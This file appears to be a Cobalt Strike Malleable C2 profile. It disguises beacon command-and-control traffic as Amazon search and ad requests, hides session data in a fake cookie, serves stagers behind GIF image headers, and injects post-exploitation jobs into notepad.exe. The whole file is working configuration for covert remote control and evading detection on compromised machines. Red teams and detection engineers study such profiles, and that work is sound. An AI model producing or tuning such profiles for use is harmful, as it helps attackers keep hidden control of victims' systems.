set sleeptime "5000";
set jitter    "0";
set maxdns    "255";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0";

http-get {
	set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
	client {
		header "Accept" "*/*";
		header "Host" "www.amazon.com";
		metadata {
			base64;
			prepend "skin=noskin;session-token=";
			append ";csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996";
			header "Cookie";
			}
		}
	server {
		header "Server" "Server";
		header "x-amz-id-1" "THKUYEZKCKPGY5T42PZT";
		header "x-amz-id-2" "a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=";
		header "X-Frame-Options" "SAMEORIGIN";
		output {
			prepend "Hello world!";
			mask;
			print;
			}
		}
}

http-post {    
	set uri "/N4215/adj/amzn.us.sr.aps";
	client {
		header "Accept" "*/*";
		header "Content-Type" "text/xml";
		header "X-Requested-With" "XMLHttpRequest";
		header "Host" "www.amazon.com";
		parameter "sz" "160x600";
		parameter "oe" "ISO-8859-1;";
		id { parameter "sn"; }
		parameter "s" "3717";
		parameter "dc_ref" "http%3A%2F%2Fwww.amazon.com";
		output {
			base64;
			print;
			}
		}
	server {
		header "Server" "Server";
		header "x-amz-id-1" "THK9YEZJCKPGY5T42OZT";
		header "x-amz-id-2" "a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo=";
		header "X-Frame-Options" "SAMEORIGIN";
		header "x-ua-compatible" "IE=edge";
		output {
			prepend "Hello World!";
			mask;
			print;
			}
		}
}

http-stager {
	set uri_x86 "/_init32.gif";
	set uri_x64 "/_init64.gif";
	server {
		header "Content-Type" "image/gif";
		output {
			prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
			prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
			prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
			print;
			}
		}
}

https-certificate {
	set O  "dmcjna";
	set CN "dmcjna";
	set validity "365";
}

post-ex {
	set spawnto_x86 "%windir%\\syswow64\\notepad.exe";
	set spawnto_x64 "%windir%\\sysnative\\notepad.exe";
}
